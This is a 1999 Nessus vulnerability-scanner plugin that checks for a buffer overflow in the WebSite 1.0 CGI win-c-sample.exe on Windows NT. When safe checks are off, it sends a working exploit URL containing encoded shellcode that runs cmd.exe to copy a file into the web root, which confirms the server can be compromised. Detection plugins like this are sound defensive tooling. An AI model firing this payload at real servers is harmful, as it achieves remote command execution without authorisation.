#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10008);
 script_version ("$Revision: 1.18 $");
 script_bugtraq_id(2078);
 script_cve_id("CVE-1999-0178");
# Name :
 script_name(english:"WebSite 1.0 buffer overflow",
 	     francais:"WebSite 1.0 : dépassement de buffer");

# Description :
  script_description(
  		english:string("There is a buffer overflow in some 
		WebSite 1.0 CGI scripts which allow a remote intruder 
		to execute any command on the remote host.

		Platform affected : WindowsNT
		
		Solution : Upgrade to the latest version, or contact 
		your vendor for a patch.
		
		Risk factor : High"),

		francais:string("Dans certains cgi WebSite 1.0, un dépassement de buffer permet à un intrus d'executer n'importe quelle commande sur le serveur cible.\n
Système affecté : WindowsNT\nFacteur de risque : Elevé"));

 

# Copyright :
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
# Summary :
  script_summary(english:"WebSite 1.0 CGI arbitrary code execution",
  		 francais:"Execute du code arbitraire sur la machine distante");
		 
# Family
  script_family(english:"Remote file access",
  		francais:"Accès aux fichiers distants");
		
 script_category(ACT_MIXED_ATTACK); # mixed
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit();
}

##########################
#			 #
# The actual script code # 
#			 #
##########################


if(safe_checks())
{
 port = is_cgi_installed("/cgi-shl/win-c-sample.exe");
 if(port)
 {
  alrt = "
There may be buffer overflow in the remote cgi win-c-sample.exe.
An attacker may use this flaw to execute arbitrary commands
on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : delete it
Risk factor : High";

  security_hole(port:port, data:alrt);
 }
 exit(0);
}


command = "/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A%06<_u%03%80.?FAI%84%C0u%F0h0%10%F0wYhM\\y[X%050PzPA9%01u%F0%83%E9%10%FF%D1h0%10%F0wYh%D0PvLX%0500vPA9%01u%F0%83%E9%1C%FF%D1cmd.exe_/c_copy_\WebSite\readme.1st_\WebSite\htdocs\x1.htm";

port = is_cgi_installed("x1.htm");
if(!port)
{
 is_cgi_installed(command);
 port = is_cgi_installed("x1.htm");
 if(port)security_hole(port);
}


 
 

		  
